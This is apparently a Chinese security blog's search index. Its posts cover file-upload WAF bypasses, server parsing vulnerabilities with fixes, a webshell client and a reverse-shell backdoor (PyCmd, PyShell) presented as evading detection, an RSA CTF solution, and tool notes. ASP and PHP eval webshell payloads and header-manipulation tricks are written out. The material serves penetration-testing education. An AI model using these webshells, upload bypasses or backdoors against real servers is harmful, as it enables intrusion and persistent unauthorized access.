<h5 id="8-2-filename"><a href="#8-2-filename" class="headerlink" title="8.2 filename"></a>8.2 filename</h5><p>针对早期版本安全狗，可以多加一个filename<br><img src="/upload_image/20160922/3.png" alt=""><br>或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：<br><img src="/upload_image/20160922/13.png" alt=""></p>
<h5 id="8-3-POST-GET"><a href="#8-3-POST-GET" class="headerlink" title="8.3 POST/GET"></a>8.3 POST/GET</h5><p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。<br>此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p>
<h5 id="8-4-以上方式"><a href="#8-4-以上方式" class="headerlink" title="8.4 以上方式"></a>8.4 以上方式</h5><p>针对WAF，以上介绍的服务器解析漏洞、文件包含漏洞等都可以尝试绕过。</p>
<p><em>————————————————2017.2.6更新————————————————–</em></p>
<h5 id="8-5-利用waf本身缺陷"><a href="#8-5-利用waf本身缺陷" class="headerlink" title="8.5 利用waf本身缺陷"></a>8.5 利用waf本身缺陷</h5><h6 id="删除实体里面的Conten-Type字段"><a href="#删除实体里面的Conten-Type字段" class="headerlink" title="删除实体里面的Conten-Type字段"></a>删除实体里面的Conten-Type字段</h6><p><img src="/upload_image/20160922/4.png" alt=""><br>第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">正常包：Content-Disposition: form-data; name=<span class="string">"image"</span>; filename=<span class="string">"085733uykwusqcs8vw8wky.png"</span>Content-Type: image/png</div><div class="line">构造包：Content-Disposition: form-data; name=<span class="string">"image"</span>; filename=<span class="string">"085733uykwusqcs8vw8wky.png</span></div><div class="line">C.php"</div></pre></td></tr></table></figure></p>
<h6 id="删除Content-Disposition字段里的空格"><a href="#删除Content-Disposition字段里的空格" class="headerlink" title="删除Content-Disposition字段里的空格"></a>删除Content-Disposition字段里的空格</h6><p><img src="/upload_image/20160922/5.png" alt=""><br>增加一个空格导致安全狗被绕过案列：<br>Content-Type: multipart/form-data; boundary=—————————4714631421141173021852555099<br>尝试在boundary后面加个空格或者其他可被正常处理的字符：<br>boundary= —————————47146314211411730218525550</p>
<h6 id="修改Content-Disposition字段值的大小写"><a href="#修改Content-Disposition字段值的大小写" class="headerlink" title="修改Content-Disposition字段值的大小写"></a>修改Content-Disposition字段值的大小写</h6><p><img src="/upload_image/20160922/6.png" alt=""></p>
<h6 id="Boundary边界不一致"><a href="#Boundary边界不一致" class="headerlink" title="Boundary边界不一致"></a>Boundary边界不一致</h6><p>每次文件上传时的Boundary边界都是一致的：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Content-Type: multipart/form-data; boundary=---------------------------4714631421141173021852555099</div><div class="line">Content-Length: 253</div><div class="line">-----------------------------4714631421141173021852555099</div><div class="line">Content-Disposition: form-data; name=<span class="string">"file1"</span>; filename=<span class="string">"shell.asp"</span></div><div class="line">Content-Type: application/octet-stream</div><div class="line"></div><div class="line">&lt;%<span class="built_in">eval</span> request(<span class="string">"a"</span>)%&gt;</div><div class="line">-----------------------------4714631421141173021852555099--</div></pre></td></tr></table></figure></p>
<p>但如果容器在处理的过程中并没有严格要求一致的话可能会导致一个问题，两段Boundary不一致使得waf认为这段数据是无意义的，可是容器并没有那么严谨：<br>Win2k3 + IIS6.0 + ASP<br><img src="/upload_image/20160922/7.png" alt=""></p>
<h6 id="文件名处回车"><a href="#文件名处回车" class="headerlink" title="文件名处回车"></a>文件名处回车</h6><p><img src="/upload_image/20160922/8.png" alt=""></p>
<h6 id="多个Content-Disposition"><a href="#多个Content-Disposition" class="headerlink" title="多个Content-Disposition"></a>多个Content-Disposition</h6><p>在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过，Win2k8 + IIS7.0 + PHP<br><img src="/upload_image/20160922/9.png" alt=""></p>
<h5 id="利用NTFS-ADS特性"><a href="#利用NTFS-ADS特性" class="headerlink" title="利用NTFS ADS特性"></a>利用NTFS ADS特性</h5><p>ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。<br><img src="/upload_image/20160922/10.png" alt=""></p>
<h4 id="其他情况补充"><a href="#其他情况补充" class="headerlink" title="其他情况补充"></a>其他情况补充</h4><h5 id="文件重命名绕过"><a href="#文件重命名绕过" class="headerlink" title="文件重命名绕过"></a>文件重命名绕过</h5><p>如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。<br><img src="/upload_image/20160922/11.png" alt=""></p>
<h5 id="特殊的长文件名绕过"><a href="#特殊的长文件名绕过" class="headerlink" title="特殊的长文件名绕过"></a>特殊的长文件名绕过</h5><p>文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试：<br>shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg</p>
<h5 id="反删除"><a href="#反删除" class="headerlink" title="反删除"></a>反删除</h5><p>将下图file1改成了file4，这样就不会把这个文件删除了。（JCMS漏洞）<br><img src="/upload_image/20160922/12.png" alt=""></p>
<p><hr></p>
<h3 id="文件校验的几点建议"><a href="#文件校验的几点建议" class="headerlink" title="文件校验的几点建议"></a>文件校验的几点建议</h3><ul>
<li>文件扩展名服务端白名单校验。</li>
<li>文件内容服务端校验。</li>
<li>上传文件重命名。</li>
<li>隐藏上传文件路径。</li>
</ul>
<p>　　以上几点，可以防御绝大多数上传漏洞，但是需要跟服务器容器结合起来。如果解析漏洞依然存在，那么没有绝对的安全。</p>
<p>参考文章：<br><a href="https://xianzhi.aliyun.com/forum/read/458.html?fpage=2" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/read/458.html?fpage=2</a><br><em>还有一篇tools上大牛的文章，url暂时找不到了……</em></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[服务器解析漏洞]]></title>
      <url>http://thief.one/2016/09/21/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<p>　　服务器解析漏洞算是历史比较悠久了，但如今依然广泛存在。在此记录汇总一些常见服务器的解析漏洞，比如IIS6.0、IIS7.5、apache、nginx等方便以后回顾温习。<br><a id="more"></a></p>
<h4 id="（一）IIS5-x-6-x解析漏洞"><a href="#（一）IIS5-x-6-x解析漏洞" class="headerlink" title="（一）IIS5.x-6.x解析漏洞"></a>（一）IIS5.x-6.x解析漏洞</h4><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p>
<h5 id="目录解析-6-0"><a href="#目录解析-6-0" class="headerlink" title="目录解析(6.0)"></a>目录解析(6.0)</h5><p>形式：www.xxx.com/xx.asp/xx.jpg<br>原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。</p>
<h5 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h5><p>形式：www.xxx.com/xx.asp;.jpg<br>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。</p>
<h5 id="解析文件类型"><a href="#解析文件类型" class="headerlink" title="解析文件类型"></a>解析文件类型</h5><p>IIS6.0 默认的可执行文件除了asp还包含这三种 :<br>/test.asa<br>/test.cer<br>/test.cdx</p>
<h5 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h5><p>1.目前尚无微软官方的补丁，可以通过自己编写正则，阻止上传xx.asp;.jpg类型的文件名。<br>2.做好权限设置，限制用户创建文件夹。</p>
<h4 id="（二）apache解析漏洞"><a href="#（二）apache解析漏洞" class="headerlink" title="（二）apache解析漏洞"></a>（二）apache解析漏洞</h4><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>　　Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</p>
<h5 id="漏洞形式"><a href="#漏洞形式" class="headerlink" title="漏洞形式"></a>漏洞形式</h5><p>www.xxxx.xxx.com/test.php.php123</p>
<h5 id="其余配置问题导致漏洞"><a href="#其余配置问题导致漏洞" class="headerlink" title="其余配置问题导致漏洞"></a>其余配置问题导致漏洞</h5><p>（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</p>
<h5 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h5><p>1.apache配置文件，禁止.php.这样的文件执行，配置文件里面加入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;Files ~ “.(php.|php3.)”&gt;</div><div class="line">        Order Allow,Deny</div><div class="line">        Deny from all</div><div class="line">&lt;/Files&gt;</div></pre></td></tr></table></figure></p>
<p>2.用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so<br>把#号去掉，重启apache,在网站根目录下建立.htaccess文件,代码如下:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;IfModule mod_rewrite.c&gt;</div><div class="line">RewriteEngine On</div><div class="line">RewriteRule .(php.|php3.) /index.php</div><div class="line">RewriteRule .(pHp.|pHp3.) /index.php</div><div class="line">RewriteRule .(phP.|phP3.) /index.php</div><div class="line">RewriteRule .(Php.|Php3.) /index.php</div><div class="line">RewriteRule .(PHp.|PHp3.) /index.php</div><div class="line">RewriteRule .(PhP.|PhP3.) /index.php</div><div class="line">RewriteRule .(pHP.|pHP3.) /index.php</div><div class="line">RewriteRule .(PHP.|PHP3.) /index.php</div><div class="line">&lt;/IfModule&gt;</div></pre></td></tr></table></figure></p>
<h4 id="（三）nginx解析漏洞"><a href="#（三）nginx解析漏洞" class="headerlink" title="（三）nginx解析漏洞"></a>（三）nginx解析漏洞</h4><h5 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>　　Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：</p>
<p>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
<h5 id="漏洞形式-1"><a href="#漏洞形式-1" class="headerlink" title="漏洞形式"></a>漏洞形式</h5><p>www.xxxx.com/UploadFiles/image/1.jpg/1.php<br>www.xxxx.com/UploadFiles/image/1.jpg%00.php<br>www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</p>
<p>另外一种手法：上传一个名字为test.jpg，以下内容的文件。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?PHP fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST[cmd])?&gt;'</span>);?&gt;</div></pre></td></tr></table></figure></p>
<p>然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。</p>
<h5 id="修复方案-2"><a href="#修复方案-2" class="headerlink" title="修复方案"></a>修复方案</h5><p>1.修改php.ini文件，将cgi.fix_pathinfo的值设置为0;<br>2.在Nginx配置文件中添加以下代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">　　<span class="keyword">if</span> ( <span class="variable">$fastcgi_script_name</span> ~ ..*/.*php ) &#123;</div><div class="line">　　<span class="built_in">return</span> 403;</div><div class="line">　　&#125;</div></pre></td></tr></table></figure></p>
<p>　　这行代码的意思是当匹配到类似test.jpg/a.php的URL时，将返回403错误代码。</p>
<h4 id="（四）IIS7-5解析漏洞"><a href="#（四）IIS7-5解析漏洞" class="headerlink" title="（四）IIS7.5解析漏洞"></a>（四）IIS7.5解析漏洞</h4><p>IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[PyCmd 加密隐形木马]]></title>
      <url>http://thief.one/2016/09/18/PyCmd-%E5%8A%A0%E5%AF%86%E9%9A%90%E5%BD%A2%E6%9C%A8%E9%A9%AC/</url>
      <content type="html"><![CDATA[<p>　　之前写了一个基于python的一句话木马客户端程序，这个程序的作用大致就是为了绕过防护设备，使敏感数据能在网络里自由穿梭。由于编程能力有限，当时以python程序作为客户端，php代码作为服务端，勉强能用，但是缺乏jsp的服务端，使之功能很局限。幸好有大神<a href="https://github.com/8caomei" target="_blank" rel="external">caomei</a>相助，帮助实现了jsp端的代码，故将两者相结合，方便使用。<br><a id="more"></a></p>
<h4 id="PyCmd使用"><a href="#PyCmd使用" class="headerlink" title="PyCmd使用"></a>PyCmd使用</h4><p>　　我这里准备了2个靶机，分别装有php与jsp的运行环境，用来模拟真实的网站服务器。<br>为了方便，我已经把服务端木马程序放到了服务器网站目录下：</p>
<ul>
<li>php网站木马地址：<a href="http://10.0.3.13/test/p.php" target="_blank" rel="external">http://10.0.3.13/test/p.php</a></li>
<li>jsp网站木马地址：<a href="http://192.168.10.149:8080/Test/1.jsp" target="_blank" rel="external">http://192.168.10.149:8080/Test/1.jsp</a></li>
</ul>
<p>此时，运行PyCmd.py程序：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python PyCmd.py -u http://10.0.3.13/<span class="built_in">test</span>/p.php -p <span class="built_in">test</span> [--proxy]</div></pre></td></tr></table></figure>
<p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python PyCmd.py -u http://192.168.10.149:8080/Test/1.jsp -p <span class="built_in">test</span> [--proxy]</div></pre></td></tr></table></figure></p>
<p>程序会自动判断输入的网站类型<br>输入参数：</p>
<ul>
<li>-h         查看帮助信息</li>
<li>-u         网站木马地址</li>
<li>-p         木马shell密码</li>
<li>–proxy    开启本地代理（方便调试）</li>
</ul>
<p>注：当开启本地调试，需运行Fiddler程序，或者其他抓包软件。</p>
<h4 id="PyCmd数据加密"><a href="#PyCmd数据加密" class="headerlink" title="PyCmd数据加密"></a>PyCmd数据加密</h4><p>PyCmd程序的长处在于它对往来的数据进行了加密，可以绕过防火墙对数据内容的校验。<br>当执行cmd命令时，通过Fiddler抓包查看数据：<br><img src="/upload_image/20160918/002.png" alt=""><br><img src="/upload_image/20160918/003.png" alt=""></p>
<h4 id="PyCmd木马隐身"><a href="#PyCmd木马隐身" class="headerlink" title="PyCmd木马隐身"></a>PyCmd木马隐身</h4><p>用D盾扫描上传的木马服务端文件，显示为正常文件，成功躲过查杀<br><img src="/upload_image/20160918/001.png" alt=""></p>
<h4 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h4><p>PyCmd  <a href="https://github.com/tengzhangchao/PyCmd" target="_blank" rel="external">下载地址</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[基于Python的WebServer]]></title>
      <url>http://thief.one/2016/09/14/%E5%9F%BA%E4%BA%8EPython%E7%9A%84WebServer/</url>
      <content type="html"><![CDATA[<p>　　WebServer的主要功能是用来运行代码，处理http请求等服务，比如常见的Apache，IIS，Nginx等都可以用来解析代码，处理请求。以上几种容器（中间件）功能强大，但是安装配置比较麻烦，对于像我这样的菜鸟来说，搭建一个web服务器可能要花几天时间。如果我们搭建web服务器并不是专门为了处理大规模的请求，而只是为了测试使用，那么一个方便速成的WebServer就至关重要了。<br><a id="more"></a></p>
<h4 id="Python-WebServer编程介绍"><a href="#Python-WebServer编程介绍" class="headerlink" title="Python WebServer编程介绍"></a>Python WebServer编程介绍</h4><ul>
<li>BaseHTTPServer: 提供基本的Web服务和处理器类，分别是HTTPServer和BaseHTTPRequestHandler。</li>
<li>SimpleHTTPServer: 包含执行GET和HEAD请求的SimpleHTTPRequestHandler类。</li>
<li>CGIHTTPServer: 包含处理POST请求和执行CGIHTTPRequestHandler类</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -m SimpleHTTPServer 8000</div></pre></td></tr></table></figure>
<p>python内置很多好用的库，此时打开浏览器，访问localhost:8000端口即可。</p>
<h4 id="PyWebServer介绍"><a href="#PyWebServer介绍" class="headerlink" title="PyWebServer介绍"></a>PyWebServer介绍</h4><p>　　由于用python搭建一个简易的WebServer十分方便，因此我便写一个简单的启动器，类似于SimpleHTTPServer。为了方便没有安装python环境的windows机子启动，用pyinstaller工具将py程序打包成了exe可执行程序。</p>
<h5 id="Linux下运行代码"><a href="#Linux下运行代码" class="headerlink" title="Linux下运行代码"></a>Linux下运行代码</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">python PyWebServer.py -h</div><div class="line">python PyWebServer.py -i 10.0.0.1 -p 8888   <span class="comment">##指定ip与端口,默认为8888</span></div></pre></td></tr></table></figure>
<h5 id="windows下运行代码"><a href="#windows下运行代码" class="headerlink" title="windows下运行代码"></a>windows下运行代码</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">PyWebServer.exe -h  </div><div class="line">PyWebServer.exe -p 8888      <span class="comment">##指定端口,默认为8888</span></div></pre></td></tr></table></figure>
<p>运行完以后,可以在其他机子上访问，进行文件下载等操作！</p>
<h4 id="PyWebServer功能"><a href="#PyWebServer功能" class="headerlink" title="PyWebServer功能"></a>PyWebServer功能</h4><p>功能可以自由想象发挥，比如说：</p>
<ul>
<li>可以在服务器上运行程序，解析一段精心构造的py代码，远程执行系统命令。（如不在同一网段，需要转发端口）</li>
<li>可以在服务器上运行程序，用来替代FTP等工具，下载服务器上的文件（当服务器是linux时，使用比较方便）<br>……</li>
</ul>
<h4 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h4><p>PyWebServer     <a href="https://github.com/tengzhangchao/PyWebServer" target="_blank" rel="external">下载地址</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[RSA加密算法解析]]></title>
      <url>http://thief.one/2016/09/06/RSA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E8%A7%A3%E6%9E%90/</url>
      <content type="html"><![CDATA[<p>　　几个月前参加了一次CTF比赛，其中遇到了RSA加密解密题，当时也是一头雾水，赛后便查找资料整理了一番，在此总结分享。<br><a id="more"></a></p>
<h4 id="算法介绍"><a href="#算法介绍" class="headerlink" title="算法介绍"></a>算法介绍</h4><p>　　RSA加密算法属于公钥加密算法，是一种非对称密码算法，所谓非对称，就是一个密码用来加密，另一个密码用来解密，一般来说，用公钥加密，私钥解密，当然也有其他情况。</p>
<h4 id="算法原理"><a href="#算法原理" class="headerlink" title="算法原理"></a>算法原理</h4><p>　　RSA算法基于一个事实：将两个大素数相乘十分容易，但是想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。RSA算法三个参数：n、e1、e2</p>
<p>n=p<em>q   （p、q为2个大质数） n的二进制所占用的位数即秘钥的长度。<br>e1与e2是一对相关的值，e1可以任意取，但要求e1与(p-1)</em>(q-1)互质；要求(e2<em>e1)mod((p-1)</em>(q-1))=1。<br>(n,e1),(n,e2)就是密钥对，其中(n,e1)为公钥，(n,e2)为私钥。</p>
<h4 id="算法公式"><a href="#算法公式" class="headerlink" title="算法公式"></a>算法公式</h4><p>假设：<br>A:明文<br>B:密文</p>
<p>——用公钥加密公式——<br>A=B^e2 mod n<br>B=A^e1 mod n      </p>
<p>——用私钥加密公式——<br>A=B^e1 mod n<br>B=A^e2 mod n</p>
<h4 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h4><h5 id="题目概要"><a href="#题目概要" class="headerlink" title="题目概要"></a>题目概要</h5><p>这是一个公钥加密，公钥解密的RSA题目<br>给出公钥密码为：{920139713,19}，其中920139713为n，19为e1。<br>待解密的密文B为：<br>704796792<br>752211152<br>274704164<br>18414022<br>368270835<br>483295235<br>263072905<br>459788476<br>483295235<br>459788476<br>……<br>最终求解私钥A的值？</p>
<h5 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h5><p>列出公式：公钥加密<br>假设：<br>A:明文<br>B:密文<br>A=B^e2 mod n<br>B=A^e1 mod n</p>
<p>此题给出了B,n,e1,求A的值，带入公式2即可求解。</p>
<h5 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">import string</div><div class="line">strs=string.digits+string.lowercase    <span class="comment">#列举a-z数字</span></div><div class="line"></div><div class="line">f=open(<span class="string">"data.txt"</span>)   <span class="comment">#把密文B的内容写进data.txt，方便程序读取</span></div><div class="line">data=f.readlines()</div><div class="line">f.close()</div><div class="line"></div><div class="line">plaintext=<span class="string">""</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> b <span class="keyword">in</span> data:    <span class="comment">#取出所有密文(b)</span></div><div class="line">	<span class="keyword">for</span> a <span class="keyword">in</span> strs:   <span class="comment">#取出所有可能的明文(a)</span></div><div class="line">		<span class="keyword">if</span> ord(a)**19 % 920139713==int(b.strip()):         <span class="comment">#ord   将字符串转换为ascii码</span></div><div class="line">			plaintext+=a</div><div class="line"></div><div class="line"><span class="built_in">print</span> plaintext</div></pre></td></tr></table></figure>
<h5 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h5><p>flag13212je2ue28fy71w8u87y31r78eu1e2</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[PyShell 木马后门]]></title>
      <url>http://thief.one/2016/09/05/PyShell-%E6%9C%A8%E9%A9%AC%E5%90%8E%E9%97%A8/</url>
      <content type="html"><![CDATA[<p>　　在渗透测试过程中，经常会遇到一种状况：获取到了目标服务器的shell，需要进一步开展内网渗透，然而由于各种原因无法远程登录服务器，此时内网渗透往往很难开展。由此难点，我研发了一款具有针对性的后门程序，功能有点类似于NC(瑞士军刀)，但不局限于NC的功能，在此分享以表对NC的敬意。<br><a id="more"></a></p>
<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[HELP]  PyShell.exe [-listen(-slave)] [ip] [port]        <span class="comment">#绿色免环境版</span></div><div class="line">[HELP]  python PyShell.py [-listen(-slave)] [ip] [port]</div></pre></td></tr></table></figure>
<h3 id="功能参数"><a href="#功能参数" class="headerlink" title="功能参数"></a>功能参数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[HELP]  <span class="built_in">exit</span>    ----退出连接</div><div class="line">[HELP]  <span class="built_in">kill</span>    ----退出连接并自毁程序</div><div class="line">[HELP]  playtask    ----创建计划任务</div><div class="line">[HELP]  python -p file.py    ----在肉鸡上执行本地python脚本</div></pre></td></tr></table></figure>
<h3 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h3><h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h4><p>本机的IP地址为：10.0.3.119<br>本机上装了一个虚拟机，IP地址为：192.168.67.130 </p>
<p>本机充当为目标服务器(被攻端),虚拟机充当为攻击机(攻击端)</p>
<h4 id="运行木马"><a href="#运行木马" class="headerlink" title="运行木马"></a>运行木马</h4><p>首先在虚拟机上运行PyShell程序，监听一个未被使用的端口，如：2222</p>
<p>接着在本机上运行PyShell程序，连接虚拟机的这个端口<br><img src="/upload_image/20160905_2/001.png" alt=""></p>
<p>可以看到，虚拟机上反弹了一个shell<br><img src="/upload_image/20160905_2/002.png" alt=""></p>
<p>在虚拟机shell中查询ip地址，是本机的10网段<br><img src="/upload_image/20160905_2/003.png" alt=""></p>
<p>在虚拟机shell中执行命令，使本机执行python脚本，进行内网端口扫描<br><img src="/upload_image/20160905_2/004.png" alt=""></p>
<blockquote>
<p>提示：python脚本并未传到本机，而是通过数据包形式传递到了PyShell文件内执行，数据流量经过16进制+Base64加密，可以绕过防火墙</p>
</blockquote>
<p>创建计划任务<br><img src="/upload_image/20160905_2/005.png" alt=""></p>
<p>本机查看结果<br><img src="/upload_image/20160905_2/006.png" alt=""></p>
<h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><ul>
<li><p>程序对互相传输的数据进行了加密，以绕过防火墙。</p>
</li>
<li><p>当需要在肉鸡上执行python脚本时，不需要在肉鸡上上传相应的脚本文件，只需将本地脚本内容加密传输到肉鸡，并执行即可。</p>
</li>
<li><p>此程序在执行完命令以后，并不能时时回显结果，也就是说python脚本运行完以后才会返回输出，有待完善。</p>
</li>
</ul>
<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>PyShell 木马后门  <a href="https://github.com/tengzhangchao/PyShell/" target="_blank" rel="external">下载地址</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[windows服务器信息收集工具]]></title>
      <url>http://thief.one/2016/09/04/windows%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/</url>
      <content type="html"><![CDATA[<p>　　在日常的安全服务工作中，经常会遇到需要收集目标服务器系统信息的需求，例如：系统日志，中间件日志，系统信息等。收集这些信息，有助于分析服务器安全状况，也有利于被入侵后的取证分析。然而客户网络环境往往很复杂，服务器较多，系统版本也不尽相同，给手工收集带来了很多麻烦，因此便研究开发了<em>服务器信息收集工具</em>。<br><a id="more"></a></p>
<h2 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h2><ul>
<li>收集系统日志</li>
<li>收集系统信息<ol>
<li>开机时间</li>
<li>IP_MAC地址</li>
<li>用户信息</li>
<li>操作系统版本</li>
<li>进程信息</li>
<li>hosts文件</li>
<li>端口信息</li>
</ol>
</li>
<li>收集中间件日志<ol>
<li>Apache</li>
<li>IIS</li>
<li>Tomcat</li>
<li>JBOSS</li>
</ol>
</li>
<li>全盘搜索日志文件</li>
</ul>
<h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><p>程序帮助：<br><img src="/upload_image/20160905/001.png" alt=""></p>
<p>1.运行程序，开始收集系统信息。<br><img src="/upload_image/20160905/002.png" alt=""></p>
<p>2.程序运行期间，可以输入目标磁盘盘符，对该盘进行扫描，获取.log文件；如果不输入直接回车，默认为全盘扫描。<br><img src="/upload_image/20160905/003.png" alt=""></p>
<p>3.运行完毕，会在当前目录下生成采集的日志以及系统信息文件夹。<br><img src="/upload_image/20160905/004.png" alt=""></p>
<blockquote>
<p>注意：如果程序运行报错(MSVCR100.dll),请前往 <a href="https://github.com/tengzhangchao/Windows_Packages/raw/master/VC%2B%2B%20Redist/2010_vcredist_x64.exe" target="_blank" rel="external">下载</a> VC运行库进行安装,安装完成后再次运行程序即可。</p>
</blockquote>
<h2 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h2><p>windows服务器信息收集工具 <a href="https://github.com/tengzhangchao/InForMation" target="_blank" rel="external">下载地址</a></p>
]]></content>
    </entry>
    
  
  
</search>
